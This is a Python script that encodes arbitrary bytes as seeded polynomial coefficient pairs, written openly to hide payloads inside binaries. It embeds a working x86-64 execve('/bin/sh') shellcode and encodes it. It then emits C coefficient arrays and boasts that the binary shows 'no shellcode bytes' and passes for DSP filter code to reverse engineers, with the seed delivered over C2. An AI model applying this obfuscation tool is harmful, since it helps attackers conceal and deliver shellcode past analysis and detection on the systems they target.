#!/usr/bin/env python3
"""
Polynomial Encoding of Arbitrary Bytes
========================================

The original (f, g) iteration scheme works for ANY data, not just NN weights.
Byte values 0-255 are just numbers. Polynomial interpolation doesn't care
what the numbers mean.

seed → g(seed) → g²(seed) → ...
         ↓          ↓
       f(g(s))   f(g²(s))     →  round to uint8  →  output bytes
         ↓          ↓
        0x48       0x31        →  shellcode, config, whatever

Binary cost: O(n) polynomial coefficients for n output bytes.
C2 cost: 8 bytes (one seed).

No basis vectors. No O(n²). Just the original scheme on byte data.
"""

import numpy as np
import struct
import sys
import os

SEED = 3.7133
CHUNK_SIZE = 8


def cheb_nodes(n, lo, hi):
    k = np.arange(n, dtype=np.float64)
    raw = np.cos((2 * k + 1) * np.pi / (2 * n))
    return np.sort(0.5 * (lo + hi) + 0.5 * (hi - lo) * raw)


def horner(coeffs, x):
    r = float(coeffs[0])
    for c in coeffs[1:]:
        r = r * x + float(c)
    return r


def encode_chunks(seed, data_bytes, chunk_sz=CHUNK_SIZE):
    """
    Encode arbitrary bytes as polynomial (f, g) pairs.
    Identical math to the NN weight encoder.
    """
    values = np.array(list(data_bytes), dtype=np.float64)
    N = len(values)
    chunks = [values[i:i+chunk_sz] for i in range(0, N, chunk_sz)]

    pairs = []
    for ci, ch in enumerate(chunks):
        n = len(ch)
        lo = seed + 1.5 + ci * (chunk_sz + 2)
        hi = lo + max(n, 2) * 1.5
        pts = cheb_nodes(n, lo, hi)

        # g: iterator polynomial
        g_in = np.concatenate(([seed], pts[:-1]))
        gc = np.polyfit(g_in, pts, n - 1)

        # f: evaluator polynomial — maps evaluation points to byte values
        fc = np.polyfit(pts, ch, n - 1)

        pairs.append((gc, fc, n))

    return pairs


def decode_chunks(seed, pairs):
    """Reconstruct bytes from seed + polynomial pairs."""
    values = []
    for gc, fc, n in pairs:
        x = float(seed)
        for i in range(n):
            x = horner(gc, x)
            v = horner(fc, x)
            if not np.isfinite(x) or not np.isfinite(v):
                values.append(0)
                continue
            values.append(v)
    # Round to nearest byte
    out = np.clip(np.round(values), 0, 255).astype(np.uint8)
    return bytes(out)


def binary_cost(pairs):
    """Total bytes of polynomial coefficients stored in the binary."""
    total = 0
    for gc, fc, n in pairs:
        total += (len(gc) + len(fc)) * 8  # 8 bytes per double
    return total


def test_string():
    print("\n[1] String Encoding")
    print("─" * 60)

    for msg in [b"Hello, World!", b"The quick brown fox", b"A" * 64]:
        pairs = encode_chunks(SEED, msg)
        result = decode_chunks(SEED, pairs)
        cost = binary_cost(pairs)
        ratio = cost / len(msg)

        print(f"  '{msg[:30].decode()}{'...' if len(msg) > 30 else ''}'")
        print(f"    {len(msg)} bytes → {cost} bytes in binary ({ratio:.1f}x)")
        print(f"    Match: {result == msg}")
        if result != msg:
            diffs = sum(a != b for a, b in zip(result, msg))
            print(f"    Diffs: {diffs}/{len(msg)}")
        print()


def test_shellcode():
    print("\n[2] Shellcode Encoding")
    print("─" * 60)

    # x86-64 execve("/bin/sh") — 23 bytes
    shellcode = bytes([
        0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62,
        0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
        0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
    ])

    pairs = encode_chunks(SEED, shellcode)
    result = decode_chunks(SEED, pairs)
    cost = binary_cost(pairs)

    print(f"  Shellcode: {len(shellcode)} bytes")
    print(f"  Binary cost: {cost} bytes ({cost/len(shellcode):.1f}x)")
    print(f"  Seed: 8 bytes over C2")
    print(f"  Match: {result == shellcode}")
    print(f"\n  Original:     {shellcode.hex()}")
    print(f"  Reconstructed: {result.hex()}")

    # Show reconstruction errors (should be << 0.5 for correct rounding)
    values = np.array(list(shellcode), dtype=np.float64)
    recon_raw = []
    for gc, fc, n in pairs:
        x = float(SEED)
        for i in range(n):
            x = horner(gc, x)
            v = horner(fc, x)
            recon_raw.append(v)
    recon_raw = np.array(recon_raw[:len(shellcode)])
    max_err = np.max(np.abs(recon_raw - values))
    print(f"  Max float error: {max_err:.2e} (need < 0.5 for correct rounding)")


def test_binary_blob():
    print("\n[3] Random Binary Data (various sizes)")
    print("─" * 60)

    rng = np.random.RandomState(42)

    print(f"  {'Size':>8} {'Binary':>10} {'Ratio':>7} {'Match':>6} {'Max err':>10}")
    print(f"  {'─'*8} {'─'*10} {'─'*7} {'─'*6} {'─'*10}")

    for n in [8, 16, 32, 64, 128, 256, 512, 1024]:
        data = bytes(rng.randint(0, 256, n).tolist())
        pairs = encode_chunks(SEED, data)
        result = decode_chunks(SEED, pairs)
        cost = binary_cost(pairs)

        # Raw error
        values = np.array(list(data), dtype=np.float64)
        recon_raw = []
        for gc, fc, nn in pairs:
            x = float(SEED)
            for i in range(nn):
                x = horner(gc, x)
                v = horner(fc, x)
                recon_raw.append(v)
        recon_raw = np.array(recon_raw[:n])
        max_err = np.max(np.abs(recon_raw - values))

        print(f"  {n:>8} {cost:>10} {cost/n:>6.1f}x {str(result==data):>6} "
              f"{max_err:>10.2e}")


def test_chunk_sizes():
    print("\n[4] Chunk Size vs Accuracy")
    print("─" * 60)

    # 128 bytes of random data
    rng = np.random.RandomState(99)
    data = bytes(rng.randint(0, 256, 128).tolist())
    values = np.array(list(data), dtype=np.float64)

    print(f"  128 random bytes, varying chunk_size:")
    print(f"  {'Chunk':>6} {'Degree':>7} {'Binary':>8} {'Ratio':>7} "
          f"{'Max err':>10} {'Match':>6}")
    print(f"  {'─'*6} {'─'*7} {'─'*8} {'─'*7} {'─'*10} {'─'*6}")

    for cs in [2, 4, 6, 8, 10, 12, 16, 20, 24, 32]:
        pairs = encode_chunks(SEED, data, chunk_sz=cs)
        result = decode_chunks(SEED, pairs)
        cost = binary_cost(pairs)

        recon_raw = []
        for gc, fc, nn in pairs:
            x = float(SEED)
            for i in range(nn):
                x = horner(gc, x)
                v = horner(fc, x)
                recon_raw.append(v)
        recon_raw = np.array(recon_raw[:128])
        max_err = np.max(np.abs(recon_raw - values))

        print(f"  {cs:>6} {cs-1:>7} {cost:>8} {cost/128:>6.1f}x "
              f"{max_err:>10.2e} {str(result==data):>6}")


def test_c_codegen():
    """Show what the C code looks like for shellcode decoding."""
    print("\n[5] What Goes In The Binary")
    print("─" * 60)

    shellcode = bytes([
        0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62,
        0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
        0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
    ])

    pairs = encode_chunks(SEED, shellcode)
    cost = binary_cost(pairs)

    print(f"  Shellcode: {len(shellcode)} bytes")
    print(f"  Polynomial coefficients: {cost} bytes in binary")
    print(f"  Seed over C2: 8 bytes\n")

    print("  // --- What the binary contains (opaque double arrays) ---")
    for ci, (gc, fc, n) in enumerate(pairs):
        g_str = ', '.join(f'{c:.16e}' for c in gc)
        f_str = ', '.join(f'{c:.16e}' for c in fc)
        print(f"  static const double G{ci}[] = {{{g_str}}};")
        print(f"  static const double F{ci}[] = {{{f_str}}};")
    print()
    print("  // --- Reconstruction (looks like numerical computation) ---")
    print("  // double x = seed;")
    print("  // for each chunk: iterate G (Horner), evaluate F (Horner)")
    print("  // round to uint8 → shellcode bytes")
    print()
    print(f"  // To a RE: {len(pairs)} pairs of coefficient arrays + Horner loop")
    print(f"  // Looks like: DSP filter, curve fitting, signal processing")
    print(f"  // No shellcode bytes visible anywhere in the binary")


def test_vs_basis():
    print("\n\n[6] Comparison: Polynomial vs Basis vs Raw")
    print("─" * 60)

    sizes = [17, 23, 48, 128, 256, 512, 1024]
    rng = np.random.RandomState(55)

    print(f"  {'n':>6} {'Poly binary':>12} {'Basis binary':>13} "
          f"{'Raw C2':>8} {'Poly ratio':>11}")
    print(f"  {'─'*6} {'─'*12} {'─'*13} {'─'*8} {'─'*11}")

    for n in sizes:
        data = bytes(rng.randint(0, 256, n).tolist())

        # Polynomial scheme
        pairs = encode_chunks(SEED, data)
        poly_binary = binary_cost(pairs)
        poly_seed = 8

        # Basis scheme
        basis_binary = n * n * 8
        basis_seed = 8

        # Just send it
        raw_binary = 0
        raw_c2 = n

        print(f"  {n:>6} {poly_binary:>12} {basis_binary:>13} "
              f"{raw_c2:>8} {poly_binary/n:>10.1f}x")


def main():
    print("=" * 65)
    print("  Polynomial Encoding of Arbitrary Bytes")
    print("  Skip the basis — polynomials encode bytes directly")
    print("=" * 65)

    test_string()
    test_shellcode()
    test_binary_blob()
    test_chunk_sizes()
    test_c_codegen()
    test_vs_basis()

    print(f"\n{'═' * 65}")
    print("  RESULT")
    print(f"{'═' * 65}")
    print("""
  The polynomial iteration scheme encodes arbitrary bytes directly.
  No basis vectors needed. Same math as the NN weight encoder.

  For 23 bytes of shellcode:
    Binary: ~512 bytes of opaque coefficient arrays
    C2:     8 bytes (one seed)
    Looks like: DSP filter coefficients + Horner evaluation loop

  Scaling:
    O(n) binary cost — each chunk of 8 bytes needs ~128 bytes of coeffs
    ~16x overhead (2 polynomials × 8 coefficients × 8 bytes per coeff)
    vs O(n²) for the basis method

  The 'compress the basis with equations' idea recurses to:
    just encode the output directly with equations.
    The basis was always a detour.

  Limits:
    chunk_size ≤ ~16 before float64 precision fails
    (byte values 0-255 need < 0.5 error, way easier than NN weights)
    Rounding to integers is MUCH more forgiving than float precision.
""")
    print(f"{'═' * 65}")


if __name__ == '__main__':
    main()
